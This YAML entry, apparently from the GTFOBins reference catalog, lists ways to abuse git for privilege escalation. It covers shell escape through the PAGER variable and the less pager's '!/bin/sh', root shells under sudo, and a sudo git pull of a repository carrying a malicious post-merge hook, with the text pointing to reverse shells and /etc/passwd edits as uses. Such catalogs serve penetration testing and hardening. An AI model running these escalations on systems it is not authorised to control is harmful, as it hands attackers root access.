---
functions:
  shell:
    - code: PAGER='sh -c "exec sh 0<&1"' git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        git help config
        !/bin/sh
  sudo:
    - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo git -p help config
        !/bin/sh
    - description: The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo git branch --help config
        !/bin/sh
    - code: |
        git remote add <name> <repo with malicious post-merge hook>
        sudo git pull <name>
    - description: This can be useful when only git pull is allowed sudo access. Any commands in the post-merge git hook of the repository which is pulled will be executed as root. This enables several ways to pop a root shell, including but not limited to: Adding an SSH key, starting a reverse shell and modifying /etc/passwd to create a new account with root access.
  limited-suid:
    - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
---
